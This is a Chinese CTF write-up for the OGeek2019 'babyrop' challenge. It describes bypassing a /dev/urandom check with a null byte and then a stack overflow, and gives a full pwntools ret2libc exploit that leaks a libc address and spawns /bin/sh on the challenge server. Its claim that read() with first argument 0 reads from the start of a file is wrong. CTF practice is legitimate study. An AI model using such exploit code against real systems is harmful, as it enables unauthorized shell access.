(OGeek2019)babyrop

[OGeek2019]babyrop

read()函数当第一个参数为0时，可能是指示函数从文件或输入流的开头开始读取数据。

首先对程序进行检查

发现不能在本地执行，放入ida中进行查看试试

程序主要实现的功能就是打开/dev/urandom取出一个随机字符串，read(fd,&buf,4u)是把fd所指向的随机字符串写入到buf文件中，长度是4个字节，v6=read(0,buf,0x20u)是将终端输入的0x20个字节读取到buf中，将buf和随机的字符串比较，如果相等就退出程序，不相等就返回v5的值，但是这个函数没有对v5进行处理，可以使用栈溢出，对v5进行赋值，v5的值决定了下一个函数对read在终端读取的字节数，通过对buf局部变量实现栈溢出，构造的exp如下所示：

from pwn import *
from LibcSearcher import *
context(os="linux",arch='i386',log_level="debug")
io = remote("node4.buuoj.cn",25845)
#io = process('./pwn')
buf = b"\0"+b'a'*(0x7-1)+b'\xff'
io.sendline(buf)
io.recvline()
elf = ELF('./pwn')
write_plt = elf.plt['write']
write_got = elf.got['write']
main_addr = 0x8048825
payload = b'a'*(0xe7+4)+p32(write_plt)+p32(main_addr)+p32(1)+p32(write_got)+p32(4)
io.sendline(payload)
write_addr = u32(io.recv(4))
print(hex(write_addr))
libc = ELF('./libc-2.23.so')
libc_addr = write_addr - libc.symbols['write']
sys_addr = libc_addr + libc.symbols['system']
binsh_addr = libc_addr + libc.search(b'/bin/sh').__next__()
io.sendline(buf)
io.recvline()
payload2 = b'a'*(0xe7+4)+p32(sys_addr)+p32(1)+p32(binsh_addr)
io.sendline(payload2)
io.interactive()
